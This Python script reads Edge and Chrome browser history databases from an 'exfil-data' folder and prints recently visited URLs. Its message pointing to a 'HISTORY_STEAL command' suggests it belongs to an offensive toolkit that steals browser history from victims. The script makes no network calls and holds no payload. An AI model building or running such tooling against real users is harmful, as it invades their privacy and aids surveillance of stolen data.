import sqlite3
import os
import glob
from datetime import datetime, timedelta

# Configuration

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(SCRIPT_DIR)
EXFIL_DIR = os.path.join(PROJECT_ROOT, "exfil-data")

def webkit_to_datetime(webkit_timestamp):
    """Converts a WebKit timestamp (microseconds since 1601) to a readable string."""
    if not webkit_timestamp:
        return "N/A"
    try:
        epoch_start = datetime(1601, 1, 1)
        delta = timedelta(microseconds=webkit_timestamp)
        return (epoch_start + delta).strftime('%Y-%m-%d %H:%M:%S')
    except:
        return "Invalid"

def get_latest_history(browser_name):
    """Finds the most recent History .db file for a given browser."""
    files = glob.glob(os.path.join(EXFIL_DIR, f"{browser_name}_History_*.db"))
    if not files:
        return None
    return max(files, key=os.path.getmtime)

def process_history(name):
    db_path = get_latest_history(name)
    if not db_path:
        print(f"[*] No history found for {name}.")
        return

    print(f"[*] Processing {name} History...")
    print(f"    DB: {os.path.basename(db_path)}")

    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        
        # Query the 'urls' table for most visited/recent sites
        # schemas differ slightly across versions but 'url', 'title', and 'last_visit_time' are stable
        cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
        
        rows = cursor.fetchall()
        if not rows:
            print(f"    [!] No history entries found in {name} database.")
        else:
            print(f"\n{'Last Visited (UTC)':<20} | {'Visits':<6} | {'URL'}")
            print("-" * 100)
            for url, title, count, last_visit in rows:
                visit_time = webkit_to_datetime(last_visit)
                # Filter out very long URLs for display
                display_url = url[:70] + "..." if len(url) > 70 else url
                print(f"{visit_time:<20} | {count:<6} | {display_url}")
            print("\n")
        
        conn.close()
    except Exception as e:
        print(f"    [!] Error reading {name} history: {e}")

if __name__ == "__main__":
    if not os.path.exists(EXFIL_DIR):
        print(f"[!] Directory '{EXFIL_DIR}' not found. Run the HISTORY_STEAL command first.")
    else:
        print("=== Chromium History Viewer ===\n")
        process_history("Edge")
        process_history("Chrome")
